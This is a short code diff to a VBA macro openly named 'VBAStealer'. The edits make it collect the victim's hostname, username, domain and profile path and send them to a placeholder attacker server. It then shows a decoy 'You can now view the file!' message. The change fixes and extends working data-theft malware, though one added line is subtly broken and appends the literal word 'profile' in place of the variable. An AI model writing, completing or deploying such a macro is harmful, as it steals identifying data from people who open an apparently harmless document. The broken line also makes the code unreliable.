@@ -23,13 +23,14 @@ Sub VBAStealer()
     Dim domain As String
     hostname = Environ("COMPUTERNAME")
     username = Environ("USERNAME")
-    domain = Environ("USERNAME")
+    domain = Environ("USERDOMAIN")
+    profile = Environ("USERPROFILE")
     username = username + "/" + domain
     Dim url As String
     Dim Ip As String
     server1 = "<SERVERIP>"
-    server2 = "<SERVERIP"
-    url = server1 + server2 + "?" + "hostname=" + hostname + "&" + "username=" + username + "&" + "domain=" + domain
+    server2 = "<SERVERIP>"
+    url = server1 + server2 + "?" + "hostname=" + hostname + "&" + "username=" + username + "&" + "domain=" + domain + "&" + "profile=" + "profile"
     Dim res As String
     res = Exer(url)
     MsgBox("You can now view the file!")
